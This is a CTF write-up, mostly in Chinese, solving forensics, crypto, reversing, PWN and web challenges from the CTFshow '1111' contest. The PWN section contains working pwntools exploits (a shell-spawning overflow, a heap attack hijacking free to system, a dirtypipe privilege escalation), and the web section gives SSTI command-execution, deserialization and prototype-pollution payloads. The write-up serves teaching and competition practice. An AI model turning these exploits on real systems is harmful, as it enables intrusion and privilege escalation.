# CTFshow 1111 Game Wp
`Write by Frank`
- [CTFshow 1111 Game Wp](#ctfshow-1111-game-wp)
  - [MIsc](#misc)
    - [取证1](#取证1)
    - [取证2](#取证2)
    - [取证3](#取证3)
    - [没耳朵都可以听 (不会)](#没耳朵都可以听-不会)
    - [这个不好听 (不会)](#这个不好听-不会)
  - [crypto](#crypto)
    - [签到](#签到)
    - [ASR](#asr)
    - [古典](#古典)
    - [EX](#ex)
    - [math](#math)
  - [PWN](#pwn)
    - [checkin](#checkin)
    - [Findyourgirlfriend](#findyourgirlfriend)
    - [php](#php)
    - [堆](#堆)
    - [kernel](#kernel)
  - [Re](#re)
    - [签到](#签到-1)
    - [flower](#flower)
    - [破解飞机大战](#破解飞机大战)
    - [没时间好好爱你，所以选择单身 (不会)](#没时间好好爱你所以选择单身-不会)
  - [web](#web)
    - [签到](#签到-2)
    - [SSTI](#ssti)
    - [ez\_inject (不会)](#ez_inject-不会)
    - [迷雾重重 (不会)](#迷雾重重-不会)
    - [上传](#上传)

## MIsc
### 取证1
注册表看用户名，基本信息看版本 全部网络信息能看到本地的ip  
windows.info.Info  22621
windows.netscan 192.168.26.129
windows.registry.printkey --key "ControlSet001\Control\ComputerName\ComputerName" ZHUYUN_S_PC
ctfshow{ZHUYUN_S_PC_192.168.26.129_22621}
### 取证2
windows.filescan.FileScan \Users\h\Documents\Tencent Files\54297198\
文本：/www.bilibili.com/video/BV1ZU4y1G7AP/
文本：短剧 穿成魔尊后我一心求死
0xe3015d72f180  \Users\h\Documents\Tencent Files\54297198\nt_qq\nt_db\group_msg_fts.db-wal 
ctfshow{54297198_穿成魔尊后我一心求死_BV1ZU4y1G7AP}
### 取证3
0xe30160188e00  \Users\h\AppData\Roaming\ToDesk\dev\Hmohgnsyc.exe       216
ctfshow{程序名称(区分大小写)_隐藏的软件名称(小写)_对应的域名信息(小写)
Hmohgnsyc.exe 完全没记录，应该就是它了  
dump出来改后缀就能看到www.jieba.net了  
ctfshow{Hmohgnsyc.exe_todesk_jieba.net}
### 没耳朵都可以听 (不会)
随便找个网上的：
```
0xfffbe000 1
0xfffbe044 148
0xfffbe264 7472
0xfffbe064 860
0xfffbe244 1395
```
他的；
```
0xfffbe060 799
0xfffbe040 140
0xfffbe260 6900
0xfffbe240 1370
0xfffbe264 507
0xfffbe064 60
0xfffbe244 91
0xfffbe044 10
```
多了几个自称原版的(LSB=4)，很奇怪

### 这个不好听 (不会)
还没看

## crypto
### 签到
```python
from Crypto.Util.number import *

n=0x846d39bff2e430ce49d3230c7f00b81b23e4f0c733f7f52f6a5d32460e456e5f
c=0x4eeec51849a85e5a6566f8d73a74b1e64959aa893f98e01c1e02c3120496f8b1
for d in range(12):
    print(long_to_bytes(pow(c,d,n)))
```

### ASR
嗯猜R}是flag的结尾
```
print(long_to_bytes(nextprime(40913285701005622718863058877533926183158872052161364026817991159)))
print(long_to_bytes(prevprime(40913285701005622718863058877533926183158872052161364026817991531)))
```

### 古典
```python
s = 'QZNALEW{QZNOB_ZL1A_1A_BOS11U_NHSM}'

for a in range(26):
    for b in range(26):
        r = ""
        for c in s:
            if c.isupper():
                r += chr(((ord(c) - ord('A')) * a + b) % 26 + ord('A'))
            else:
                r += c
        if r.startswith("CTFSHOW"):
            print(r)
```

### EX
```python
while True:
    p = givemeprime(10)
    q = n // p
    if isprime(q):
        d = inverse(e, (p - 1) * (q - 1))
        m = pow(c, d, n)
        print(long_to_bytes(m))
        break
```

### math
chatGPT秒了
```py
import math
from Crypto.Util.number import *


def generate_primes(n):
    """Generate all prime numbers up to n using the Sieve of Eratosthenes."""
    sieve = [True] * (n + 1)
    sieve[0:2] = [False, False]
    for i in range(2, int(math.isqrt(n)) + 1):
        if sieve[i]:
            for multiple in range(i * i, n + 1, i):
                sieve[multiple] = False
    primes = [p for p, is_prime in enumerate(sieve) if is_prime]
    return primes


def legendre_exponent(p, N):
    """Compute the exponent e_p of prime p in N! using Legendre's formula."""
    exponent = 0
    denom = p
    while denom <= N:
        exponent += N // denom
        denom *= p
    return exponent


def calculate_d(N, modulus=None):
    """Calculate d = τ(N!^2) = ∏(2e_p + 1) over all primes p ≤ N."""
    primes = generate_primes(N)
    d = 1
    for p in primes:
        e_p = legendre_exponent(p, N)
        factor = 2 * e_p + 1
        if modulus:
            d = (d * factor) % modulus
        else:
            d *= factor
    return d


N = 1111111

modulus = bytes_to_long(b'ctfshow' * 11)
d = calculate_d(N, modulus)
n = ...
c = ...
leak = ...
print(long_to_bytes(pow(c, d + leak, n)))
```
## PWN
### checkin
```
from pwn import *


p = remote("pwn.challenge.ctf.show", 28153)
p.send(p64(0xffffffffff600400) * 30 + b'\x13')
p.sendafter(b'wtf?', b'sh\x00')
p.interactive()
```
### Findyourgirlfriend
1
read PAT""H;s""h
/bin
### php
有后门就不pwn了（快去玩N1的php-master鸭！）  
func=PHP_PRINIT_FUNCTION&param=cat%20/secretFlag.txt
### 堆
单链表，每个bins独立shadowkey  
type|key|next  
FIFO  
[0x20] [0x40] [0x80] [0x100]  

强烈谴责不给dockerfile的pwn  
ubuntu 22和20的mmap行为是不一样的（主要是ASLR的特点不一样）  
本地出了很久远程打不通...想是不是出题人还在用20的ubuntu结果去20调打远程一发通了

```py
from pwn import *

libc = ELF("./libc.so.6")

for ty in range(16):
    # p = process(["./ld-linux-x86-64.so.2", "./pwn"], env={"LD_PRELOAD": libc.path})
    p = remote("pwn.challenge.ctf.show", 28185)
    try:
        def add(_index, _size, _content):
            p.sendlineafter(b'>> ', b'1')
            p.sendlineafter(b':', str(_index).encode())
            p.sendlineafter(b':', str(_size).encode())
            p.sendafter(b':', _content)


        def show(_index):
            p.sendlineafter(b'>> ', b'2')
            p.sendlineafter(b':\n', str(_index).encode())
            return p.recvline()[:-1]


        def delete(_index):
            p.sendlineafter(b'>> ', b'3')
            p.sendlineafter(b':', str(_index).encode())

        add(6, 0x20, b'/bin/ls;cat c*\x00')

        add(0, 0x40, b'A' * (0x40 - 16))
        add(1, 0x40, b'B' * (0x40 - 16))
        add(4, 0x40, b'X')
        delete(4)
        shadow_key_1 = show(0)[0x40 - 16:]
        log.success(f"shadow_key_1[{len(shadow_key_1)}]: {hex(u64(shadow_key_1))}")
        delete(1)
        leak = u64(show(0)[0x40 - 16 + 8:] + b'\x00\x00')
        log.success(f"leak: {hex(leak)}")
        libc_base_guess = leak  # - (leak & 0xffffff)
        libc_base_guess += 0x13000 - 0xa0
        log.success(f"libc_base_guess: {hex(libc_base_guess)}")
        delete(0)

        add(0, 0x80, b'A' * (0x80 - 16))
        add(1, 0x80, b'B' * (0x80 - 16))
        shadow_key_2 = show(0)[0x80 - 16:]
        log.success(f"shadow_key_2[{len(shadow_key_2)}]: {hex(u64(shadow_key_2))}")
        delete(1)
        delete(0)

        add(0, 0x100, b'A' * (0x100 - 16))
        add(1, 0x100, b'B' * (0x100 - 16))
        shadow_key_3 = show(0)[0x100 - 16:]
        log.success(f"shadow_key_3[{len(shadow_key_3)}]: {hex(u64(shadow_key_3))}")
        delete(1)
        delete(0)

        add(5, 0x100, b'C' * (0x80 - 16) + shadow_key_2 + p64(0x404078))
        add(4, 0x80, b'C' * (0x80 - 16))  # overflow

        add(3, 0x80, b'C' * (0x40 - 16) + shadow_key_1 + shadow_key_2)  # set free_list 2 as 0x404078
        add(0, 0x40, b'D' * (0x40 - 16))  # overflow
        add(1, 0x40, b'X')  # set free_list 1 as shadow_key_2

        victim_addr = 0x404088
        hijack_free = libc.symbols["system"] + libc_base_guess

        add(3, 0x80, b'a' * (0x4040B8 - 0x404088) + p64(hijack_free))  # we are writing to 0x404088

        delete(6)
        p.interactive()
    except Exception as e:
        if e == KeyboardInterrupt:
            break
    p.close()

```
### kernel
有dirtypipe就不打ko的洞了
https://dirtypipe.cm4all.com/  
```py
from pwn import *
import base64


with open("./a.out", "rb") as f:
    exp = base64.b64encode(f.read())

p = remote("pwn.challenge.ctf.show", 28103)
# p = process(['./run.sh'])

p.sendlineafter(b'CTFshowPWN login:', b'ctfshow')
p.sendlineafter(b'Password:', b'ctfshow')
count = 0
for i in range(0, len(exp), 0x200):
    p.sendlineafter(b"$ ", b"echo -n \"" + exp[i:i + 0x200] + b"\" >> /tmp/b64_exp")
    count += 1
    log.info(f"count: {count} / {len(exp) // 0x200}")

p.sendlineafter(b"$ ", b"cat /tmp/b64_exp | base64 -d > /tmp/exploit")
p.sendlineafter(b"$ ", b"chmod +x /tmp/exploit")
p.sendlineafter(b"$ ", b"/tmp/exploit /bin/ping")
p.sendlineafter(b"$ ", b"cat /root/*")

p.interactive()
```
## Re
### 签到
CyberChef_v10.5.2.html#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'Latin1','string':'yNgIvYJf/J4BRJOa'%7D,%7B'option':'Hex','string':''%7D,'ECB/NoPadding','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=anZqZVRRVkdjREdQZ0ZlQytFOTBQejZ3WXpqY0JLNDlZRHgyVys2WUZUamsvd21hN09hNUozTzJuczhPcHRieA
### flower
手动nop一下几个花指令：
```c
  sub_5413E3(std::cin, v15);
  v14 = "!@#$%^&*()ABCDEFGHIJKLMNOPQRSTUVWXYZ<>abcdefghijklmnopqrstuvwxyz";
  sub_541159(v13, (int)"rTrO{T%C$EJVzyoCo*s_zxWByRzOng%gvC[cvBw_$Dw+AiC_syG[");
  v12 = 0;
  sub_541113(v13, v12);
  qmemcpy(v11, "abcdefghijklmnopqrstuvwxyz!@#$%^&*()ABCDEFGHIJKLMNOPQRSTUVWXYZ<>", 64);
  sub_54143D(v10, v11, 97);
  sub_541159(v9, (int)"zUsD$T+M%UKu{xWBySBN%ykQ{xODySoG&isWyRzN%yk_sDNN%TwP$URa");
```
两组密文-码表 
一个密文-1得到招新赛flag
一个码表-1得到ctfshowflag
### 破解飞机大战
交叉引用搜一下得分函数的引用，找到：
```c
  if ( get_score() == 10000 )
  {
    scanf("%d", v7);
    HIBYTE(v8) = v7[0];
    for ( i = 0; i <= 92439; ++i )
      loc_419060[i] ^= HIBYTE(v8);
```
前面有点CC，试了一下开头不是push ebp，那异或CC试试，发现很有规律地往栈上写数据，但是结尾也不是正常结尾  
```py
for i in range(92439):
    ida_bytes.patch_byte(0x419060 + i, ida_bytes.get_byte(addr) ^ 0xcc)
```
不过在结尾看到了FFD9，去开头果然看到了FFD8，那按U之后y改数据类型然后shift+E之后正则再提取一下  
C606(..)4640  
得到的东西就是flag的图片了
### 没时间好好爱你，所以选择单身 (不会)
```
#########
#@#######
#***##**#
#*#*###*#
#*#**####
#**#*####
##*#*####
####**+##
#########
```
sddssdsssdd5rruffrrffuuffrrffurr  
最后一段的东西如果是正规的FRU应该可以用RRUFFRRFFUUFFRRFFURR造出来，但问题是：
- 这题实现的代码根本就是旋转单面上的块且不动其他面的块
- 对称的操作可以用大小写互相替换，或者F=fff，所以多解  

那密码是啥呢 还是说程序有什么我没找到的SMC？太谜语人了  
爆密码的话也不知到他的那三个1算不算输入

## web
### 签到
```
https://841cc38c-5e82-47eb-bdf0-1f872d785ebd.challenge.ctf.show/?dsbctf=O:7:%22ctfshow%22:4:%7Bs:10:%22%00ctfshow%00d%22;s:1:%221%22;s:10:%22%00ctfshow%00s%22;s:1:%222%22;s:10:%22%00ctfshow%00b%22;s:1:%223%22;s:12:%22%00ctfshow%00ctf%22;i:123;%7D
```
### SSTI 
config存状态就可以了  
{{config.update(s=lipsum.__globals__)}}
{{config.update(b=config.s.os.popen)}}
{{config.b('cat /flag').read()}}
### ez_inject (不会)

https://5a0f56c7-6060-43be-8254-487f30ff3c61.challenge.ctf.show/login/echo/register
{"username":"8","password":"2","__proto__":{"is_admin":true}}  
__proto__[is_admin]  
2","is_admin1":1,"fuck":"f  

我不太行 我不会做

### 迷雾重重 (不会)
怎么挖反序列化呢 phpggc脚本小子失败了  
原来的也只能找到一个最明显的任意文件删除（但是甚至不知道web服务的目录，寄）   

### 上传
https://github.com/codeplutos/java-security-manager-bypass/tree/master/invoke-native-method  
动态库传成1.jar然后 load("/var/www/html/uploads/1.jar") 就可以RCE了